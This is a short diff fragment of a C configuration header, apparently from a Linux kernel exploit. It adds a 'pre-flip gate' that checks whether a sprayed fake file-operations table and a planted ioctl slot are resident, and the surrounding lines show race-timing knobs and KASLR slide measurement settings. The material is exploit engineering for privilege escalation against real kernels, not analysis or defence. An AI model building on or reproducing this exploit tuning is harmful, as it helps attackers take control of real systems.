@@ -102,6 +102,12 @@
  * 6.1.162 measured: 125ms delay + fresh-page x5 = 67%; 50ms too narrow,
  * 300ms panics. Timing knob only — geometry/offsets untouched. */
 #define APP_FOPS_FRESH_PAGE_ATTEMPTS 5
+/* Pre-flip gate (forensic S6 §2): verify the sprayed fake_fops table is
+ * really resident BEFORE the flip (genuine-fd readback of the planted
+ * ioctl slot; 5 misses -> clean exit with no flip). Macro-gated: ONLY this
+ * target defines it; every other target takes the legacy single-shot path
+ * in main.c untouched. */
+#define APP_FOPS_PREFLIP_GATE 1
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
